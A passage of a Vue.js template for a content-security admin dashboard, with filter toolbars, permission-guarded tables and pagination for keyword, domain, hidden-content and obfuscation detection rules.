                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Is Enabled Filter -->
              <select 
                v-model="keywordIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="keywordOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="keyword">Keyword (A-Z)</option>
                <option value="-keyword">Keyword (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2.5 shrink-0">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model="keywordPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Button -->
              <button 
                v-if="keywordSearchQuery || keywordCategory !== 'all' || keywordSeverity !== 'all' || keywordMatchType !== 'all' || keywordIsActive !== 'all' || keywordIsEnabled !== 'all'"
                @click="resetKeywordFilters"
                class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
                title="Reset keyword filters"
              >
                Reset
              </button>
            </div>
          </div>
        </div>

        <!-- Keyword Rules Table Wrapper -->
        <div v-if="!canViewKeywords" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security keyword rules.</p>
        </div>
        <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
          <!-- Loading state -->
          <div v-if="isKeywordsLoading" class="p-12 text-center space-y-3">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-xs text-muted-foreground">Loading keyword rules from security registry...</p>
          </div>
          <!-- Error state -->
          <div v-else-if="keywordsError" class="p-12 text-center space-y-3 text-rose-500">
            <ShieldAlert class="w-8 h-8 mx-auto" />
            <p class="text-sm font-semibold">Failed to Retrieve Keyword Rules</p>
            <p class="text-xs text-muted-foreground">{{ keywordsError }}</p>
            <UiButton size="sm" @click="fetchKeywordRules" class="mt-2">Retry</UiButton>
          </div>
          <!-- Table state -->
          <div v-else>
            <UiTable 
              :columns="keywordRuleColumns" 
              :data="keywordRulesData"
              empty-text="No keyword rules found"
              empty-description="No items match your active rules query."
            >
              <!-- Keyword Cell -->
              <template #cell-keyword="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.keyword }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Match Type Cell -->
              <template #cell-match_type="{ item }">
                <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
                  {{ item.match_type }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewKeywords"
                    @click.stop="openKeywordViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View keyword rule details"
                    aria-label="View keyword rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditKeywordRule"
                    @click.stop="openEditKeywordRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit keyword rule"
                    aria-label="Edit keyword rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteKeywordRule"
                    @click.stop="openDeleteKeywordRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete keyword rule"
                    aria-label="Delete keyword rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="keywordRulesCount > 0"
              :current-page="keywordPage"
              :total-pages="keywordRulesPages"
              :total-count="keywordRulesCount"
              :items-per-page="keywordPageSize"
              item-label="keyword rules"
              @update:current-page="keywordPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Domains Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'domains'" class="space-y-4">
        <!-- Domain Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="domainSearchQuery"
                type="text" 
                placeholder="Search domains..." 
                class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
              />
              <button 
                v-if="domainSearchQuery" 
                @click="domainSearchQuery = ''"
                class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filters Dropdowns Row -->
            <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="domainCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="domainSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Match Type Filter -->
              <select 
                v-model="domainMatchType"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Match Types</option>
                <option value="EXACT">Exact Domain</option>
                <option value="SUBDOMAIN">Domain And Subdomains</option>
              </select>

              <!-- Is Active Filter -->
              <select 
                v-model="domainIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Is Enabled Filter -->
              <select 
                v-model="domainIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="domainOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="domain">Domain (A-Z)</option>
                <option value="-domain">Domain (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2.5 shrink-0">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model="domainPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Button -->
              <button 
                v-if="domainSearchQuery || domainCategory !== 'all' || domainSeverity !== 'all' || domainMatchType !== 'all' || domainIsActive !== 'all' || domainIsEnabled !== 'all'"
                @click="resetDomainFilters"
                class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
                title="Reset domain filters"
              >
                Reset
              </button>
            </div>
          </div>
        </div>

        <!-- Domain Rules Table Wrapper -->
        <div v-if="!canViewDomains" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security domain rules.</p>
        </div>
        <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
          <!-- Loading state -->
          <div v-if="isDomainsLoading" class="p-12 text-center space-y-3">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-xs text-muted-foreground">Loading domain rules from security registry...</p>
          </div>
          <!-- Error state -->
          <div v-else-if="domainsError" class="p-12 text-center space-y-3 text-rose-500">
            <ShieldAlert class="w-8 h-8 mx-auto" />
            <p class="text-sm font-semibold">Failed to Retrieve Domain Rules</p>
            <p class="text-xs text-muted-foreground">{{ domainsError }}</p>
            <UiButton size="sm" @click="fetchDomainRules" class="mt-2">Retry</UiButton>
          </div>
          <!-- Table state -->
          <div v-else>
            <UiTable 
              :columns="domainRuleColumns" 
              :data="domainRulesData"
              empty-text="No domain rules found"
              empty-description="No items match your active rules query."
            >
              <!-- Domain Cell -->
              <template #cell-domain="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.domain }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Match Type Cell -->
              <template #cell-match_type="{ item }">
                <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
                  {{ item.match_type }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewDomains"
                    @click.stop="openDomainViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View domain rule details"
                    aria-label="View domain rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditDomainRule"
                    @click.stop="openEditDomainRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit domain rule"
                    aria-label="Edit domain rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteDomainRule"
                    @click.stop="openDeleteDomainRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete domain rule"
                    aria-label="Delete domain rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="domainRulesCount > 0"
              :current-page="domainPage"
              :total-pages="domainRulesPages"
              :total-count="domainRulesCount"
              :items-per-page="domainPageSize"
              item-label="domain rules"
              @update:current-page="domainPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Hidden Content Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'hidden_content'" class="space-y-4">
        <!-- Hidden Content Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="hiddenContentSearchQuery" 
                type="text" 
                placeholder="Search hidden content rules (e.g. display:none, opacity:0)..." 
                class="w-full h-9 pl-9 pr-8 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 focus:border-ring transition-all"
              />
              <button 
                v-if="hiddenContentSearchQuery" 
                @click="hiddenContentSearchQuery = ''"
                class="absolute right-2.5 top-1/2 -translate-y-1/2 p-0.5 text-muted-foreground hover:text-foreground rounded cursor-pointer"
                title="Clear search"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filter Controls -->
            <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="hiddenContentCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="hiddenContentSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Active Filter -->
              <select 
                v-model="hiddenContentIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Enabled Filter -->
              <select 
                v-model="hiddenContentIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="hiddenContentOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="pattern">Pattern (A-Z)</option>
                <option value="-pattern">Pattern (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model.number="hiddenContentPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Filters -->
              <button 
                v-if="hiddenContentSearchQuery || hiddenContentCategory !== 'all' || hiddenContentSeverity !== 'all' || hiddenContentIsActive !== 'all' || hiddenContentIsEnabled !== 'all' || hiddenContentOrdering !== '-created_at'"
                @click="resetHiddenContentFilters"
                class="h-9 px-2.5 rounded-xl text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted transition-colors flex items-center gap-1 cursor-pointer shrink-0"
                title="Reset all filters"
              >
                <RotateCcw class="w-3.5 h-3.5" />
                <span class="hidden sm:inline">Reset</span>
              </button>
            </div>
          </div>
        </div>

        <!-- Permission Check Guard -->
        <div v-if="!canViewHiddenContent" class="p-8 text-center text-rose-500 bg-rose-500/5 border border-rose-500/20 rounded-2xl space-y-2">
          <ShieldAlert class="w-8 h-8 mx-auto text-rose-500" />
          <p class="text-sm font-semibold">Access Denied</p>
          <p class="text-xs text-muted-foreground">You do not have permission to view content security hidden content rules.</p>
        </div>

        <!-- Table Container -->
        <div v-else class="space-y-4">
          <!-- Loading State -->
          <div v-if="isHiddenContentLoading" class="p-12 text-center bg-card border border-border rounded-2xl">
            <RefreshCw class="w-8 h-8 animate-spin mx-auto text-primary" />
            <p class="text-sm font-semibold text-foreground mt-3">Loading hidden content rules...</p>
            <p class="text-xs text-muted-foreground">Querying detection rules from database</p>
          </div>

          <!-- Error State -->
          <div v-else-if="hiddenContentError" class="p-8 text-center bg-rose-500/10 border border-rose-500/30 rounded-2xl space-y-3">
            <ShieldAlert class="w-8 h-8 mx-auto text-rose-600 dark:text-rose-400" />
            <div class="space-y-1">
              <h4 class="text-sm font-bold text-rose-700 dark:text-rose-300">Failed to Load Hidden Content Rules</h4>
              <p class="text-xs text-rose-600 dark:text-rose-400">{{ hiddenContentError }}</p>
            </div>
            <UiButton size="sm" variant="outline" @click="fetchHiddenContentRules" class="border-rose-500/40 hover:bg-rose-500/10">
              <RefreshCw class="w-3.5 h-3.5 mr-1.5" />
              <span>Retry</span>
            </UiButton>
          </div>

          <!-- Real Data Table -->
          <div v-else class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
            <UiTable 
              :data="hiddenContentRulesData" 
              :columns="hiddenContentRuleColumns"
              empty-message="No hidden content rules match your filters."
            >
              <!-- CSS Declaration / Pattern Cell -->
              <template #cell-pattern="{ item }">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ item.pattern }}
                </span>
              </template>

              <!-- Category Cell -->
              <template #cell-category="{ item }">
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ item.category }}
                </span>
              </template>

              <!-- Severity Cell -->
              <template #cell-severity="{ item }">
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(item.severity))">
                  {{ item.severity }}
                </span>
              </template>

              <!-- Enabled Cell -->
              <template #cell-is_enabled="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_enabled 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_enabled ? 'Enabled' : 'Disabled' }}</span>
                </span>
              </template>

              <!-- Active Cell -->
              <template #cell-is_active="{ item }">
                <span 
                  :class="cn(
                    'px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5 w-fit',
                    item.is_active 
                      ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                      : 'bg-muted text-muted-foreground border-border'
                  )"
                >
                  <span :class="cn('w-1.5 h-1.5 rounded-full', item.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                  <span>{{ item.is_active ? 'Active' : 'Inactive' }}</span>
                </span>
              </template>

              <!-- Created At Cell -->
              <template #cell-created_at="{ item }">
                <span class="text-xs text-muted-foreground font-mono">
                  {{ formatDate(item.created_at) }}
                </span>
              </template>

              <!-- Actions Cell -->
              <template #cell-actions="{ item }">
                <div class="flex items-center justify-end gap-1.5">
                  <button 
                    v-if="canViewHiddenContent"
                    @click.stop="openHiddenContentViewModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="View hidden content rule details"
                    aria-label="View hidden content rule details"
                  >
                    <Eye class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canEditHiddenContentRule"
                    @click.stop="openEditHiddenContentRuleModal(item.id)"
                    class="p-1.5 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer"
                    title="Edit hidden content rule"
                    aria-label="Edit hidden content rule"
                  >
                    <Edit3 class="w-4 h-4" />
                  </button>
                  <button 
                    v-if="canDeleteHiddenContentRule"
                    @click.stop="openDeleteHiddenContentRuleModal(item)"
                    class="p-1.5 rounded-lg text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors cursor-pointer"
                    title="Delete hidden content rule"
                    aria-label="Delete hidden content rule"
                  >
                    <Trash2 class="w-4 h-4" />
                  </button>
                </div>
              </template>
            </UiTable>

            <!-- Pagination Controls -->
            <UiPagination 
              v-if="hiddenContentRulesCount > 0"
              :current-page="hiddenContentPage"
              :total-pages="hiddenContentRulesPages"
              :total-count="hiddenContentRulesCount"
              :items-per-page="hiddenContentPageSize"
              item-label="hidden content rules"
              @update:current-page="hiddenContentPage = $event"
            />
          </div>
        </div>
      </div>

      <!-- Obfuscation Subtab Specific Filters & Table -->
      <div v-else-if="rulesSubTab === 'obfuscation'" class="space-y-4">
        <!-- Obfuscation Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="obfuscationSearchQuery" 
                type="text" 
                placeholder="Search obfuscation rules (e.g. eval, base64, fromCharCode)..." 
                class="w-full h-9 pl-9 pr-8 bg-background border border-input rounded-xl text-xs font-medium text-foreground placeholder:text-muted-foreground outline-none focus:ring-2 focus:ring-ring/20 focus:border-ring transition-all"
              />
              <button 
                v-if="obfuscationSearchQuery" 
                @click="obfuscationSearchQuery = ''"
                class="absolute right-2.5 top-1/2 -translate-y-1/2 p-0.5 text-muted-foreground hover:text-foreground rounded cursor-pointer"
                title="Clear search"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filter Controls -->
            <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="obfuscationCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="obfuscationSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Active Filter -->
              <select 
                v-model="obfuscationIsActive"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Active Status</option>
                <option value="true">Active Only</option>
                <option value="false">Inactive Only</option>
              </select>

              <!-- Enabled Filter -->
              <select 
                v-model="obfuscationIsEnabled"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Enabled Status</option>
                <option value="true">Enabled Only</option>
                <option value="false">Disabled Only</option>
              </select>

              <!-- Ordering Filter -->
              <select 
                v-model="obfuscationOrdering"
                class="h-9 px-2.5 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="-created_at">Newest First</option>
                <option value="created_at">Oldest First</option>
                <option value="pattern">Pattern (A-Z)</option>
                <option value="-pattern">Pattern (Z-A)</option>
              </select>

              <!-- Page Size Selector -->
              <div class="flex items-center gap-1.5 border-l border-border pl-2">
                <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
                <select 
                  v-model.number="obfuscationPageSize"
                  class="h-9 px-2 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
                >
                  <option :value="5">5 / page</option>
                  <option :value="10">10 / page</option>
                  <option :value="25">25 / page</option>
                  <option :value="50">50 / page</option>
                  <option :value="100">100 / page</option>
                </select>
              </div>

              <!-- Reset Filters Button -->
              <UiButton 
                variant="ghost" 
                size="sm" 
                @click="resetObfuscationFilters" 
                class="h-9 px-2.5 text-xs text-muted-foreground hover:text-foreground"
                title="Reset filters"
              >
